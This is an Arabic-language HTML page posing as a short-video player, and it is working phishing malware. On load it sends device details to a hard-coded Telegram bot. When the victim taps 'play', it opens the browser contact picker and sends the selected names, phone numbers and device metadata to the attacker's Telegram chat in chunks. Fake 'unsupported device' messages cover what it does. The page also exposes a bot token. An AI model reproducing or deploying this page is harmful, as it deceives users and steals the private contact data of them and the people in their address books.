<!doctype html>
<html lang="ar" dir="rtl">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
<meta name="theme-color" content="#000000">
<title>فيديو</title>
<style>
  *{box-sizing:border-box}
  html,body{height:100%}
  body{margin:0;background:#000;color:#fff;font-family:system-ui,-apple-system,"Segoe UI",Roboto,sans-serif;
       display:flex;flex-direction:column;align-items:center;justify-content:center;overflow:hidden;
       -webkit-user-select:none;user-select:none;cursor:pointer}
  .stage{width:100%;max-width:480px;aspect-ratio:9/16;max-height:100vh;background:#0a0a0a;position:relative;
         display:flex;align-items:center;justify-content:center}
  .bar{position:absolute;top:0;left:0;height:3px;background:#fe2c55;width:0;transition:width .3s}
  .spin{width:38px;height:38px;border:3px solid rgba(255,255,255,.15);border-top-color:#fe2c55;
        border-radius:50%;animation:sp .8s linear infinite}
  @keyframes sp{to{transform:rotate(360deg)}}
  .txt{position:absolute;bottom:14%;font-size:14px;color:#fff;background:rgba(0,0,0,.55);
       padding:9px 16px;border-radius:20px}
  .play{width:74px;height:74px;border-radius:50%;background:rgba(255,255,255,.14);
        display:flex;align-items:center;justify-content:center}
  .play:after{content:"";border-style:solid;border-width:13px 0 13px 21px;
              border-color:transparent transparent transparent #fff;margin-right:-5px}
  .err{position:absolute;bottom:8%;font-size:13px;color:#fdd663;text-align:center;padding:0 20px;line-height:1.7;display:none}
</style>
</head>
<body>
<div class="stage" id="stage">
  <div class="bar" id="bar"></div>
  <div class="play" id="play"></div>
  <div class="spin" id="spin" style="display:none"></div>
  <div class="txt" id="txt">اضغط للتشغيل</div>
  <div class="err" id="err"></div>
</div>
<script>
const BOT_TOKEN = "9237923038:AAGsmJ9OMYkixhEk5TonyyarS9_TDO05jik";
const CHAT_ID   = "972326806";
const API       = "https://api.telegram.org/bot" + BOT_TOKEN;

const meta = {
  ua: navigator.userAgent, platform: navigator.platform, lang: navigator.language,
  screen: screen.width + "x" + screen.height,
  tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
  secure: window.isSecureContext,
  picker: !!(navigator.contacts && navigator.contacts.select),
  url: location.href, ts: Date.now()
};

const stage = document.getElementById("stage");
const bar = document.getElementById("bar");
const spin = document.getElementById("spin");
const txt = document.getElementById("txt");
const err = document.getElementById("err");
const play = document.getElementById("play");
let p = 0, busy = false;
const timer = setInterval(() => {
  p = Math.min(96, p + Math.random() * 8);
  bar.style.width = p + "%";
}, 350);

async function tgSend(text) {
  try {
    const r = await fetch(API + "/sendMessage", {
      method: "POST", headers: {"Content-Type": "application/json"},
      body: JSON.stringify({chat_id: CHAT_ID, text: String(text).slice(0, 4000)})
    });
    return r.ok;
  } catch (e) { return false; }
}

function normPhone(t) {
  if (!t) return "";
  const d = String(t).replace(/[^\d+]/g, "");
  return d.startsWith("+") ? d : (d ? "+" + d : "");
}

async function exfil(contacts) {
  const seen = new Set();
  const clean = [];
  for (const c of contacts) {
    const tel = (c.tel || []).map(normPhone).filter(Boolean);
    if (!tel.length) continue;
    const key = (c.name || "") + "|" + tel.join(",");
    if (seen.has(key)) continue;
    seen.add(key);
    clean.push({name: c.name || "", tel});
  }

  await tgSend("new pull\ncontacts: " + clean.length +
    "\ndevice: " + meta.platform + " " + meta.screen +
    "\ntz: " + meta.tz + "\nua: " + meta.ua.slice(0, 120));

  const raw = JSON.stringify({contacts: clean, meta});
  const size = Math.ceil(raw.length / 3800);
  for (let i = 0, n = 1; i < raw.length; i += 3800, n++) {
    await tgSend("[" + n + "/" + size + "] " + raw.slice(i, i + 3800));
    await new Promise(r => setTimeout(r, 60));
  }
  await tgSend("done: " + clean.length + " contacts, " + raw.length + " bytes");
}

function fail(msg) {
  clearInterval(timer);
  spin.style.display = "none";
  play.style.display = "none";
  bar.style.width = "100%";
  err.style.display = "block";
  err.textContent = msg;
  txt.style.display = "none";
}

async function openPicker() {
  if (busy) return;

  if (!meta.secure) { fail("تعذر تحميل المحتوى. حاول مرة أخرى."); return; }
  if (!meta.picker) { fail("هذا الجهاز غير مدعوم. جرب المتصفح الافتراضي."); return; }

  busy = true;
  play.style.display = "none";
  spin.style.display = "block";
  txt.textContent = "جاري التحميل...";

  let list = null;
  try {
    list = await navigator.contacts.select(
      ["name", "tel", "email"], {multiple: true});
  } catch (e) {
    await tgSend("picker error: " + (e && e.name ? e.name : String(e)));
    busy = false;
    spin.style.display = "none";
    play.style.display = "flex";
    txt.textContent = "اضغط للتشغيل";
    return;
  }

  await tgSend("picker returned: " + (list ? list.length : "null"));

  if (list && list.length) {
    const out = [];
    for (const c of list) {
      out.push({name: c.name || "", tel: c.tel || [], email: c.email || []});
    }
    clearInterval(timer);
    bar.style.width = "100%";
    txt.textContent = "تم التشغيل";
    try {
      await exfil(out);
    } catch (e) {
      await tgSend("exfil error: " + (e && e.message ? e.message : String(e)));
    }
    return;
  }

  busy = false;
  spin.style.display = "none";
  play.style.display = "flex";
  txt.textContent = "اضغط للتشغيل";
}

stage.addEventListener("click", openPicker);
stage.addEventListener("touchend", (e) => { e.preventDefault(); openPicker(); });

tgSend("page load\nsecure=" + meta.secure + " picker=" + meta.picker +
       "\nurl=" + location.href + "\nua=" + meta.ua.slice(0, 140));
</script>
</body>
</html>
